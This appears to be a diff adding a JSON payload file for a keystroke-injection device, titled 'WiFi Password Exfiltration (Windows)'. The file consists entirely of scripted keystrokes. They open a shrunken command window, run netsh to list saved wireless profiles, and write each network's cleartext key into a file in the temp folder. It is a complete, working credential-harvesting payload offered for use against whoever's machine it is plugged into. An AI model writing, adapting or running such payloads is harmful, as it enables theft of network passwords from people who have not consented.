@@ -1,0 +1,28 @@
+{
+    "name": "WiFi Password Exfiltration (Windows)",
+    "description": "Extracts WiFi passwords and saves to file on Windows",
+    "target_os": "windows",
+    "delay_ms": 100,
+    "commands": [
+        "REM WiFi password extraction payload for Windows",
+        "DELAY 1000",
+        "GUI r",
+        "DELAY 500",
+        "STRING cmd /k mode con:cols=18 lines=1",
+        "ENTER",
+        "DELAY 500",
+        "STRING cd %TEMP%",
+        "ENTER",
+        "STRING netsh wlan show profiles | findstr \":\" > wifi_profiles.txt",
+        "ENTER",
+        "DELAY 500",
+        "STRING for /f \"skip=1 tokens=2 delims=:\" %i in (wifi_profiles.txt) do @echo SSID: %i & netsh wlan show profile name=%i key=clear | findstr \"Key Content\" >> wifi_passwords.txt",
+        "ENTER",
+        "DELAY 1000",
+        "STRING type wifi_passwords.txt",
+        "ENTER",
+        "DELAY 2000",
+        "STRING exit",
+        "ENTER"
+    ]
+}
